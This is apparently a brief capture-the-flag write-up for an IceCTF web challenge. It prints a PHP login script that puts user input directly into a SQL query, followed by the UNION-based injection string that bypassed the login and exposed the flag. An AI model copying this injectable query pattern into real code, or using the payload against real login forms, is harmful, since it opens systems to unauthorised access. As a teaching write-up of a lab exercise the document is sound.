It was easy after they gave the source for login.php
```
<?php
include "config.php";
$con = mysqli_connect($MYSQL_HOST, $MYSQL_USER, $MYSQL_PASS, $MYSQL_DB);
$username = $_POST["username"];
$password = $_POST["password"];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) !== 1) {
  echo "<h1>Login failed.</h1>";
} else {
  echo "<h1>Logged in!</h1>";
  echo "<p>Your flag is: $FLAG</p>";
}

?>
```

Simply writing `' union select 1,2,3# ` in the username field gave the flag away <br>
<b>IceCTF{the_miners_union_is_a_strong_one}</b>
